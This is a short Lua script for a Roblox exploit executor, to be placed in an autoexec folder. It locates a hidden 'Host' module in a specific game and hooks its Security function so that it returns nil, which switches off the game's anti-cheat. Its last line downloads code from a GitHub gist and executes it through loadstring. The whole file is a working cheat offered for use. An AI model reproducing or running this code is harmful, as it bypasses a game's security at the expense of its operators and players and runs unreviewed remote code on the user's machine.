-- PUT IN AUTOEXEC
-- vv

repeat wait() until game:IsLoaded()
if game.CreatorId ~= 9099749 then return end
sethiddenproperty(game.Lighting, "Technology", Enum.Technology.Legacy)
local hos
for i,v in pairs(getnilinstances()) do
    if v.Name == "Host" then
        v.Parent = workspace
        hos = v
    end
end
hos = require(hos)

hookfunction(hos.Security,function(...)
        return nil
end)

-- ^^ autoexec only or else it wont work and youll reply crying that it doesnt work

--use in a game/round idc vvv
loadstring(game:HttpGet("https://gist.githubusercontent.com/crcket/5164586d886428f4236e2163aba687de/raw"))() 